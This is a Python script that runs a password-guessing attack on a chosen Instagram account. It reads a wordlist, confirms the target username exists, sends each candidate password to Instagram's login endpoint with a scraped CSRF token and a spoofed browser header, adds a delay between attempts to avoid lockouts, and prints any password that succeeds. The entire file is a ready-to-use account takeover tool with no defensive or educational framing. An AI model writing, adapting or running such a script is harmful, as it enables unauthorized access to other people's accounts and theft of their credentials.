import requests
from datetime import datetime, timedelta
import json
import time
import os

filename = 'pass.txt'
if os.path.isfile(filename):
    with open(filename) as f:
        passwords = f.read().splitlines()
        if (len(passwords) > 0):
            print ('%s Passwords loads successfully' % len(passwords))
else:
    print ('Please create passwords file (pass.txt)')
    exit()

def userExists(username):
    insta_url='https://www.instagram.com'
    r = requests.get(f"https://www.instagram.com/{username}/?__a=1")
    if (r.status_code == 404):
        print ('User not found')
        return False
    elif (r.status_code == 200):
        #followdata = json.loads(r.text)
        #fUserID = followdata['graphql']['user']['id']
        return {'username':username}

def Login(username,password):
    link = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    time = int(datetime.now().timestamp())
    response = requests.get(link)
    csrf = response.cookies['csrftoken']

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = requests.post(login_url, data=payload, headers=login_header)
    json_data = json.loads(login_response.text)
    
    if (json_data['status'] == 'fail'): 
        print("session lost so try after 10 minutes....")
        return True
    else:
        if json_data["authenticated"]:
            cookies = login_response.cookies
            cookie_jar = cookies.get_dict()
            csrf_token = cookie_jar['csrftoken']
            #print("csrf_token: ", csrf_token)
            session_id = cookie_jar['sessionid']
            #print("session_id: ", session_id)
            print("Login Success and the password is: "+password)
            return True
        else:
            print("Login Failed")
            return False
    
username = str(input('Please enter a username: '))
username = userExists(username)
if (username == False):
    exit()
else:
    username = username['username']

delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 

for i in range(len(passwords)):
    password = passwords[i]
    sess = Login(username,password)
    if (sess) == True:
        break
  
    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        an = str(input('Type y/n to exit: '))
        if (an == 'y'):
            break
        else:
            continue
